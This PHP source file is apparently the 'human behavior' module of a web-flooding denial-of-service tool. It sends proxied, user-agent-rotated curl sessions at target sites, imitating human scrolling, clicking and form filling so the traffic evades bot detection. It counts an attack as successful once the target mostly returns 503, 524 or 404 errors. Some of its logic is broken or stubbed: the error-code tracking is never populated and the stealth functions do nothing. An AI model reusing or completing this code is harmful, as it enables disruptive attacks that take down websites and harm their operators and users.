<?php

class HumanBehaviorEngine {
    private $db;
    private $config;
    private $stealthEngine;
    private $behaviorPatterns;
    private $sessionData;
    
    public function __construct($database, $config = []) {
        $this->db = $database;
        $this->config = array_merge($this->getDefaultConfig(), $config);
        $this->stealthEngine = null;
        $this->behaviorPatterns = [];
        $this->sessionData = [];
    }
    
    public function getDefaultConfig() {
        return [
            'method' => 'HUMAN_BEHAVIOR',
            'threads' => 25,
            'duration' => 300,
            'session_duration' => 120,
            'behavior_profile' => 'realistic',
            'stealth_enabled' => true,
            'proxy_rotation' => true,
            'ua_rotation' => true,
            'cookie_persistence' => true,
            'realistic_timing' => true,
            'scroll_simulation' => true,
            'click_simulation' => true,
            'form_interaction' => true,
            'page_navigation' => true,
            'mouse_movement' => true,
            'keyboard_simulation' => false
        ];
    }
    
    public function start($groupId, $targets, $profile) {
        $this->logMessage("Starting Human Behavior simulation for group: $groupId");
        
        if ($this->config['stealth_enabled']) {
            $this->initializeStealth($groupId);
        }
        
        $this->initializeBehaviorPatterns();
        
        $attackResults = [];
        
        foreach ($targets as $target) {
            $targetResult = $this->simulateHumanBehavior($target, $groupId, $profile);
            $attackResults[] = $targetResult;
        }
        
        return [
            'attack_method' => 'human-behavior',
            'group_id' => $groupId,
            'targets' => count($targets),
            'results' => $attackResults,
            'config' => $this->config,
            'behavior_patterns' => $this->behaviorPatterns
        ];
    }
    
    private function simulateHumanBehavior($target, $groupId, $profile) {
        $this->logMessage("Human behavior simulation on target: $target");
        
        $startTime = time();
        $endTime = $startTime + $this->config['duration'];
        $sessionCount = 0;
        $totalActions = 0;
        $successfulSessions = 0;
        $behaviorMetrics = [
            'page_views' => 0,
            'scroll_events' => 0,
            'click_events' => 0,
            'form_interactions' => 0,
            'navigation_events' => 0,
            'session_durations' => []
        ];
        
        while (true) {
            if ($this->shouldStop($groupId)) {
                $this->logMessage("Manual stop signal received for group: $groupId");
                break;
            }
            
            if ($this->isSuccessConditionMet($target, $groupId, $errorCodes)) {
                $this->logMessage("Success condition met for target: $target in group: $groupId");
                break;
            }
            
            $sessionResult = $this->executeHumanSession($target, $groupId, $profile);
            
            $sessionCount++;
            $totalActions += $sessionResult['total_actions'];
            
            if ($sessionResult['session_success']) {
                $successfulSessions++;
            }
            
            foreach ($behaviorMetrics as $metric => $value) {
                if (isset($sessionResult['metrics'][$metric])) {
                    if ($metric === 'session_durations') {
                        $behaviorMetrics[$metric][] = $sessionResult['metrics'][$metric];
                    } else {
                        $behaviorMetrics[$metric] += $sessionResult['metrics'][$metric];
                    }
                }
            }
            
            if ($this->config['stealth_enabled'] && $sessionCount % 5 === 0) {
                $this->rotateStealthComponents($groupId);
            }
            
            $this->simulateRealisticDelay('session_break');
        }
        
        $duration = time() - $startTime;
        $avgSessionDuration = !empty($behaviorMetrics['session_durations']) ? 
            array_sum($behaviorMetrics['session_durations']) / count($behaviorMetrics['session_durations']) : 0;
        
        $this->logMessage("Human behavior simulation completed for $target: $sessionCount sessions, $totalActions actions, Success rate: " . 
            round(($successfulSessions / max($sessionCount, 1)) * 100, 2) . "%");
        
        return [
            'target' => $target,
            'duration' => $duration,
            'total_sessions' => $sessionCount,
            'successful_sessions' => $successfulSessions,
            'total_actions' => $totalActions,
            'behavior_metrics' => $behaviorMetrics,
            'avg_session_duration' => round($avgSessionDuration, 2),
            'success_rate' => $sessionCount > 0 ? round(($successfulSessions / $sessionCount) * 100, 2) : 0,
            'actions_per_session' => $sessionCount > 0 ? round($totalActions / $sessionCount, 2) : 0
        ];
    }
    
    private function executeHumanSession($target, $groupId, $profile) {
        $sessionId = uniqid('session_');
        $this->sessionData[$sessionId] = [
            'start_time' => time(),
            'cookies' => [],
            'visited_pages' => [],
            'user_agent' => $this->getUserAgent(),
            'proxy' => $this->getProxy()
        ];
        
        $sessionStartTime = time();
        $sessionEndTime = $sessionStartTime + $this->config['session_duration'];
        $actions = 0;
        $sessionSuccess = true;
        
        $metrics = [
            'page_views' => 0,
            'scroll_events' => 0,
            'click_events' => 0,
            'form_interactions' => 0,
            'navigation_events' => 0,
            'session_durations' => 0
        ];
        
        $currentPage = $target;
        $pageResult = $this->simulatePageVisit($currentPage, $sessionId);
        $actions++;
        $metrics['page_views']++;
        
        if (!$pageResult['success']) {
            $sessionSuccess = false;
        }
        
        while (time() < $sessionEndTime && $sessionSuccess) {
            $behaviorAction = $this->selectNextBehaviorAction($currentPage, $sessionId);
            
            switch ($behaviorAction['type']) {
                case 'scroll':
                    $scrollResult = $this->simulateScrolling($currentPage, $sessionId, $behaviorAction);
                    $metrics['scroll_events'] += $scrollResult['scroll_count'];
                    break;
                    
                case 'click':
                    $clickResult = $this->simulateClicking($currentPage, $sessionId, $behaviorAction);
                    $metrics['click_events'] += $clickResult['click_count'];
                    if (isset($clickResult['new_page'])) {
                        $currentPage = $clickResult['new_page'];
                        $metrics['navigation_events']++;
                    }
                    break;
                    
                case 'form_interaction':
                    $formResult = $this->simulateFormInteraction($currentPage, $sessionId, $behaviorAction);
                    $metrics['form_interactions'] += $formResult['interaction_count'];
                    break;
                    
                case 'page_navigation':
                    $navResult = $this->simulatePageNavigation($currentPage, $sessionId, $behaviorAction);
                    if ($navResult['success']) {
                        $currentPage = $navResult['new_page'];
                        $metrics['page_views']++;
                        $metrics['navigation_events']++;
                    }
                    break;
                    
                case 'idle':
                    $this->simulateRealisticDelay('reading');
                    break;
            }
            
            $actions++;
            
            $this->simulateRealisticDelay('action');
            
            if (rand(1, 100) <= 5 && $actions > 3) {
                break;
            }
        }
        
        $sessionDuration = time() - $sessionStartTime;
        $metrics['session_durations'] = $sessionDuration;
        
        unset($this->sessionData[$sessionId]);
        
        return [
            'session_id' => $sessionId,
            'session_success' => $sessionSuccess,
            'total_actions' => $actions,
            'session_duration' => $sessionDuration,
            'metrics' => $metrics
        ];
    }
    
    private function simulatePageVisit($url, $sessionId) {
        $headers = $this->generateHumanHeaders($sessionId);
        $proxy = $this->sessionData[$sessionId]['proxy'];
        
        $ch = curl_init();
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 3,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT => $this->sessionData[$sessionId]['user_agent'],
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_COOKIEJAR => '/tmp/cookies_' . $sessionId . '.txt',
            CURLOPT_COOKIEFILE => '/tmp/cookies_' . $sessionId . '.txt'
        ]);
        
        if ($proxy && $this->config['proxy_rotation']) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy);
        }
        
        $startTime = microtime(true);
        $response = curl_exec($ch);
        $responseTime = round((microtime(true) - $startTime) * 1000);
        
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
        $error = curl_error($ch);
        
        curl_close($ch);
        
        $success = ($httpCode >= 200 && $httpCode < 400);
        
        if ($success) {
            $this->sessionData[$sessionId]['visited_pages'][] = $url;
            $this->extractPageElements($response, $sessionId);
        }
        
        if (!$success && $error) {
            $this->logMessage("Page visit error for $url: $error");
        }
        
        return [
            'success' => $success,
            'http_code' => $httpCode,
            'response_time' => $responseTime,
            'content_type' => $contentType,
            'error' => $error
        ];
    }
    
    private function simulateScrolling($url, $sessionId, $action) {
        $scrollCount = rand(3, 8);
        $scrollEvents = [];
        
        for ($i = 0; $i < $scrollCount; $i++) {
            $scrollPosition = rand(100, 2000);
            $scrollSpeed = rand(50, 200); // pixels per second
            
            $scrollEvents[] = [
                'position' => $scrollPosition,
                'speed' => $scrollSpeed,
                'timestamp' => microtime(true)
            ];
            
            usleep(rand(500000, 2000000)); // 0.5-2 seconds
        }
        
        $this->simulateRealisticDelay('reading');
        
        return [
            'scroll_count' => $scrollCount,
            'scroll_events' => $scrollEvents,
            'total_scroll_distance' => array_sum(array_column($scrollEvents, 'position'))
        ];
    }
    
    private function simulateClicking($url, $sessionId, $action) {
        $clickCount = rand(1, 3);
        $clickEvents = [];
        $newPage = null;
        
        for ($i = 0; $i < $clickCount; $i++) {
            $clickTarget = $this->selectClickTarget($url, $sessionId);
            
            $clickEvents[] = [
                'target' => $clickTarget['element'],
                'coordinates' => $clickTarget['coordinates'],
                'timestamp' => microtime(true)
            ];
            
            usleep(rand(200000, 800000)); // 0.2-0.8 seconds
            
            if ($clickTarget['navigation'] && rand(1, 100) <= 70) {
                $newPage = $this->generateNavigationURL($url, $clickTarget);
                break;
            }
        }
        
        return [
            'click_count' => $clickCount,
            'click_events' => $clickEvents,
            'new_page' => $newPage
        ];
    }
    
    private function simulateFormInteraction($url, $sessionId, $action) {
        $interactionCount = rand(2, 5);
        $interactions = [];
        
        for ($i = 0; $i < $interactionCount; $i++) {
            $fieldType = ['text', 'email', 'password', 'select', 'checkbox'][array_rand(['text', 'email', 'password', 'select', 'checkbox'])];
            
            $interactions[] = [
                'field_type' => $fieldType,
                'input_value' => $this->generateRealisticInput($fieldType),
                'typing_speed' => rand(80, 120), // characters per minute
                'timestamp' => microtime(true)
            ];
            
            usleep(rand(1000000, 3000000)); // 1-3 seconds
        }
        
        $this->simulateRealisticDelay('form_review');
        
        return [
            'interaction_count' => $interactionCount,
            'interactions' => $interactions
        ];
    }
    
    private function simulatePageNavigation($currentUrl, $sessionId, $action) {
        $navigationTypes = ['internal_link', 'back_button', 'refresh', 'bookmark'];
        $navType = $navigationTypes[array_rand($navigationTypes)];
        
        $newUrl = $this->generateNavigationURL($currentUrl, ['type' => $navType]);
        
        if ($newUrl) {
            $result = $this->simulatePageVisit($newUrl, $sessionId);
            return [
                'success' => $result['success'],
                'new_page' => $newUrl,
                'navigation_type' => $navType
            ];
        }
        
        return ['success' => false, 'navigation_type' => $navType];
    }
    
    private function selectNextBehaviorAction($currentPage, $sessionId) {
        $behaviorProfile = $this->config['behavior_profile'];
        
        $actionWeights = [
            'realistic' => [
                'scroll' => 30,
                'click' => 25,
                'form_interaction' => 15,
                'page_navigation' => 20,
                'idle' => 10
            ],
            'aggressive' => [
                'scroll' => 20,
                'click' => 35,
                'form_interaction' => 25,
                'page_navigation' => 15,
                'idle' => 5
            ],
            'passive' => [
                'scroll' => 40,
                'click' => 15,
                'form_interaction' => 10,
                'page_navigation' => 15,
                'idle' => 20
            ],
            'human' => [
                'scroll' => 35,
                'click' => 22,
                'form_interaction' => 12,
                'page_navigation' => 18,
                'wait_for_selector' => 8,
                'idle' => 5
            ],
            'mobile' => [
                'scroll' => 45,
                'click' => 30,
                'form_interaction' => 15,
                'page_navigation' => 8,
                'idle' => 2
            ],
            'reader' => [
                'scroll' => 60,
                'click' => 8,
                'form_interaction' => 2,
                'page_navigation' => 10,
                'idle' => 20
            ],
            'scanner' => [
                'scroll' => 15,
                'click' => 40,
                'form_interaction' => 35,
                'page_navigation' => 8,
                'idle' => 2
            ],
            'random' => [
                'scroll' => rand(10, 50),
                'click' => rand(10, 40),
                'form_interaction' => rand(5, 35),
                'page_navigation' => rand(5, 25),
                'idle' => rand(2, 15)
            ]
        ];
        
        $weights = $actionWeights[$behaviorProfile] ?? $actionWeights['realistic'];
        
        $random = rand(1, 100);
        $cumulative = 0;
        
        foreach ($weights as $action => $weight) {
            $cumulative += $weight;
            if ($random <= $cumulative) {
                return [
                    'type' => $action,
                    'profile' => $behaviorProfile,
                    'timestamp' => time()
                ];
            }
        }
        
        return ['type' => 'idle', 'profile' => $behaviorProfile, 'timestamp' => time()];
    }
    
    private function selectClickTarget($url, $sessionId) {
        $commonTargets = [
            ['element' => 'link', 'coordinates' => [rand(100, 800), rand(100, 600)], 'navigation' => true],
            ['element' => 'button', 'coordinates' => [rand(100, 800), rand(100, 600)], 'navigation' => false],
            ['element' => 'menu_item', 'coordinates' => [rand(100, 800), rand(100, 600)], 'navigation' => true],
            ['element' => 'image', 'coordinates' => [rand(100, 800), rand(100, 600)], 'navigation' => false],
            ['element' => 'text', 'coordinates' => [rand(100, 800), rand(100, 600)], 'navigation' => false]
        ];
        
        return $commonTargets[array_rand($commonTargets)];
    }
    
    private function generateNavigationURL($currentUrl, $clickTarget) {
        $parsedUrl = parse_url($currentUrl);
        $baseUrl = $parsedUrl['scheme'] . '://' . $parsedUrl['host'];
        
        $commonPaths = [
            '/about',
            '/contact',
            '/services',
            '/products',
            '/blog',
            '/news',
            '/support',
            '/login',
            '/register',
            '/search'
        ];
        
        if (isset($clickTarget['type']) && $clickTarget['type'] === 'back_button') {
            $visitedPages = $this->sessionData[array_keys($this->sessionData)[0]]['visited_pages'] ?? [];
            if (count($visitedPages) > 1) {
                return $visitedPages[count($visitedPages) - 2];
            }
        }
        
        if (isset($clickTarget['type']) && $clickTarget['type'] === 'refresh') {
            return $currentUrl . '?refresh=' . time();
        }
        
        $randomPath = $commonPaths[array_rand($commonPaths)];
        return $baseUrl . $randomPath;
    }
    
    private function generateRealisticInput($fieldType) {
        switch ($fieldType) {
            case 'text':
                $names = ['John Doe', 'Jane Smith', 'Mike Johnson', 'Sarah Wilson'];
                return $names[array_rand($names)];
                
            case 'email':
                $emails = ['user@example.com', 'test@domain.com', 'contact@site.org'];
                return $emails[array_rand($emails)];
                
            case 'password':
                return 'password123';
                
            case 'select':
                $options = ['Option 1', 'Option 2', 'Option 3'];
                return $options[array_rand($options)];
                
            case 'checkbox':
                return rand(0, 1) ? 'checked' : 'unchecked';
                
            default:
                return 'test input';
        }
    }
    
    private function simulateRealisticDelay($delayType) {
        $delays = [
            'action' => [500000, 2000000], // 0.5-2 seconds
            'reading' => [2000000, 8000000], // 2-8 seconds
            'form_review' => [1000000, 4000000], // 1-4 seconds
            'session_break' => [5000000, 15000000], // 5-15 seconds
            'typing' => [100000, 500000] // 0.1-0.5 seconds per character
        ];
        
        $range = $delays[$delayType] ?? $delays['action'];
        usleep(rand($range[0], $range[1]));
    }
    
    private function generateHumanHeaders($sessionId) {
        $baseHeaders = [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language: en-US,en;q=0.9',
            'Accept-Encoding: gzip, deflate, br',
            'Connection: keep-alive',
            'Upgrade-Insecure-Requests: 1',
            'Sec-Fetch-Dest: document',
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-Site: none',
            'Sec-Fetch-User: ?1',
            'Cache-Control: max-age=0'
        ];
        
        $visitedPages = $this->sessionData[$sessionId]['visited_pages'] ?? [];
        if (!empty($visitedPages)) {
            $baseHeaders[] = 'Referer: ' . end($visitedPages);
        }
        
        return $baseHeaders;
    }
    
    private function extractPageElements($response, $sessionId) {
        $elements = [
            'links' => substr_count($response, '<a '),
            'forms' => substr_count($response, '<form '),
            'buttons' => substr_count($response, '<button '),
            'inputs' => substr_count($response, '<input '),
            'images' => substr_count($response, '<img ')
        ];
        
        $this->sessionData[$sessionId]['page_elements'] = $elements;
    }
    
    private function initializeBehaviorPatterns() {
        $this->behaviorPatterns = [
            'realistic' => [
                'avg_session_duration' => 120,
                'actions_per_minute' => 3,
                'scroll_probability' => 0.8,
                'click_probability' => 0.6,
                'form_probability' => 0.3,
                'navigation_probability' => 0.4
            ],
            'aggressive' => [
                'avg_session_duration' => 60,
                'actions_per_minute' => 8,
                'scroll_probability' => 0.6,
                'click_probability' => 0.9,
                'form_probability' => 0.7,
                'navigation_probability' => 0.8
            ],
            'passive' => [
                'avg_session_duration' => 180,
                'actions_per_minute' => 1.5,
                'scroll_probability' => 0.9,
                'click_probability' => 0.3,
                'form_probability' => 0.1,
                'navigation_probability' => 0.2
            ],
            'human' => [
                'avg_session_duration' => 150,
                'actions_per_minute' => 2.5,
                'scroll_probability' => 0.85,
                'click_probability' => 0.55,
                'form_probability' => 0.25,
                'navigation_probability' => 0.35,
                'wait_for_selector' => 0.4,
                'typing_delay_ms' => [200, 800],
                'mouse_movement' => 0.7,
                'reading_pause' => 0.6
            ],
            'mobile' => [
                'avg_session_duration' => 90,
                'actions_per_minute' => 4,
                'scroll_probability' => 0.95,
                'click_probability' => 0.8,
                'form_probability' => 0.4,
                'navigation_probability' => 0.6,
                'touch_events' => 0.9,
                'swipe_gestures' => 0.7,
                'orientation_change' => 0.1,
                'zoom_events' => 0.2
            ],
            'reader' => [
                'avg_session_duration' => 240,
                'actions_per_minute' => 1.2,
                'scroll_probability' => 0.95,
                'click_probability' => 0.2,
                'form_probability' => 0.05,
                'navigation_probability' => 0.15,
                'reading_time_multiplier' => 3.0,
                'text_selection' => 0.3,
                'bookmark_probability' => 0.1,
                'back_button_usage' => 0.4
            ],
            'scanner' => [
                'avg_session_duration' => 45,
                'actions_per_minute' => 12,
                'scroll_probability' => 0.4,
                'click_probability' => 0.95,
                'form_probability' => 0.8,
                'navigation_probability' => 0.9,
                'rapid_clicking' => 0.8,
                'form_auto_fill' => 0.9,
                'tab_switching' => 0.6,
                'search_usage' => 0.7
            ],
            'random' => [
                'avg_session_duration' => rand(30, 300),
                'actions_per_minute' => rand(1, 15),
                'scroll_probability' => rand(10, 100) / 100,
                'click_probability' => rand(10, 100) / 100,
                'form_probability' => rand(5, 90) / 100,
                'navigation_probability' => rand(10, 90) / 100,
                'chaos_mode' => true,
                'random_delays' => [100, 5000],
                'unpredictable_actions' => 0.3,
                'pattern_switching' => 0.2
            ]
        ];
    }
    
    private function getUserAgent() {
        if (!$this->config['ua_rotation']) {
            return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
        }
        
        $userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15'
        ];
        
        return $userAgents[array_rand($userAgents)];
    }
    
    private function getProxy() {
        if (!$this->config['proxy_rotation'] || !$this->db) {
            return null;
        }
        
        $proxies = $this->db->getActiveProxies(1);
        if (!empty($proxies)) {
            $proxy = $proxies[0];
            return $proxy['ip_address'] . ':' . $proxy['port'];
        }
        
        return null;
    }
    
    private function initializeStealth($groupId) {
        $this->logMessage("Initializing stealth components for Human Behavior group: $groupId");
        $this->stealthEngine = true;
    }
    
    private function rotateStealthComponents($groupId) {
        if (!$this->stealthEngine) {
            return;
        }
        
        $this->logMessage("Rotating stealth components for Human Behavior group: $groupId");
    }
    
    private function shouldStop($groupId) {
        $stopFile = "/tmp/stop_signal_$groupId.flag";
        return file_exists($stopFile);
    }
    
    private function isSuccessConditionMet($target, $groupId, $errorCodes) {
        if (empty($errorCodes)) return false;
        
        $totalRequests = array_sum($errorCodes);
        if ($totalRequests < 100) return false;
        
        $successCodes = [404, 410, 503, 524];
        $successCount = 0;
        
        foreach ($successCodes as $code) {
            $successCount += $errorCodes[$code] ?? 0;
        }
        
        $successRate = $successCount / $totalRequests;
        
        if ($successRate >= 0.75) {
            $statusFile = "/tmp/success_status_$groupId.json";
            $status = [
                'target' => $target,
                'success_rate' => $successRate,
                'total_requests' => $totalRequests,
                'success_count' => $successCount,
                'timestamp' => time(),
                'condition_met' => true
            ];
            file_put_contents($statusFile, json_encode($status));
            return true;
        }
        
        return false;
    }
    
    private function logMessage($message) {
        $logFile = './logs/backend.log';
        $logDir = dirname($logFile);
        if (!is_dir($logDir)) {
            mkdir($logDir, 0755, true);
        }
        $timestamp = date('Y-m-d H:i:s');
        file_put_contents($logFile, "[$timestamp] HUMAN_BEHAVIOR: $message\n", FILE_APPEND | LOCK_EX);
    }
}
?>
